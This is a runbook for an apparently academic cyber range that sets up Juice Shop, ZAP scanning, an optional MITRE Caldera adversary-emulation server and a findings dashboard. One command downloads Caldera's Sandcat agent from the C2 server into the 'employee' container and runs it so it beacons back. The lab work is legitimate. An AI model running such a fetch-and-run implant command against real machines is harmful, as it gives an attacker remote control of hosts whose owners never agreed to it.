# AEGIS Midsem Runbook

## Current State

The range already contains Juice Shop, MySQL, and an `employee` host on the
isolated `range_net`. This pass adds OWASP ZAP and a lightweight dashboard that
unifies tool output into one findings table. MITRE Caldera is defined as an
optional Compose profile because rootless Podman may not be able to unpack the
official Caldera image without host UID/GID configuration changes.

## Start the Range

From `cyber_range/`:

```bash
docker compose up --build
```

Expected local services:

- Juice Shop: `http://localhost:8080`
- AEGIS dashboard: `http://localhost:8000`

ZAP runs inside the range for scans and does not expose a browser UI by default.

## ZAP Scan

Run this after `webapp` and `zap` are healthy:

```bash
docker exec zap zap-full-scan.py -t http://webapp:3000 -J /zap/wrk/zap-scan-SC-series.json
```

Refresh the dashboard. `/zap/wrk` is mounted to `experiments/results`, so the
JSON report is written directly into the dashboard's input directory. ZAP alerts
are read from `experiments/results/*.json` where the filename contains `zap`.

## Caldera Operation

Caldera is optional for the midsem demo path. To start it with Docker Engine or
a Podman setup that can unpack the official image:

```bash
docker compose --profile caldera up -d caldera
```

Then open `http://localhost:8888`.

If rootless Podman fails with an error about insufficient UIDs/GIDs, fix the host
Podman user namespace configuration (`/etc/subuid`, `/etc/subgid`, then
`podman system migrate`) or run this service with Docker Engine. The official
GHCR Caldera image can contain file ownership values that rootless Podman cannot
map on some machines.

Start Sandcat from the `employee` container:

```bash
docker exec -it employee bash -lc "curl -s -X POST http://caldera:8888/file/download -H 'file:sandcat.go' -H 'platform:linux' -o sandcat && chmod +x sandcat && ./sandcat -server http://caldera:8888 -group red"
```

In Caldera, run a safe discovery ability such as System Information Discovery
(`T1082`) against the `red` group. Export the operation report as JSON and save
it to:

```text
experiments/results/caldera-op-SC-series.json
```

The dashboard ingests Caldera reports when the filename contains `caldera`.

## Dashboard API

Without containers, the dashboard can be run directly from the repo root:

```bash
python backend/aegis_dashboard.py
```

Endpoints:

- `GET /api/health`
- `GET /api/findings`

When no automated reports exist yet, the API falls back to checked-in scenario
YAML so the frontend remains demoable while scan artifacts are pending.
